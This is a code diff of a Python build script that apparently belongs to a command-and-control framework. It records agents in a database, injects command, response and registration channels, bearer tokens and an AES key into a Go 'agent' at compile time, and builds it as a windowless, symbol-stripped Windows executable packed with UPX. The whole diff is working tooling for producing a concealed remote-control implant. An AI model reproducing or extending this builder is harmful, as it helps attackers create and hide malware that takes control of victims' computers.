@@ -123,21 +123,7 @@ conn.execute('''CREATE TABLE AGENTS
 conn.commit()
 conn.close()
 print("Database created successfully")
-replacements = {
-    'RESPONSE_CHANNEL': responses,
-    'REGISTRATION_CHANNEL': registration,
-    'COMMANDS_CHANNEL': commands,
-    'BEARERTOKEN': bearer,
-    'TOKENTOKEN': token,
-    'AESKEY': AESkey,
-}
-
-with open('template.go') as infile, open('agent.go', 'w') as outfile:
-    for line in infile:
-        for src, target in replacements.items():
-            line = line.replace(src, target)
-        outfile.write(line)
 
 # Build exe and pack with UPX
-subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H windowsgui \" agent.go"])
+subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H windowsgui -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
 subprocess.run(["bash", "-c", "upx --force agent.exe"])
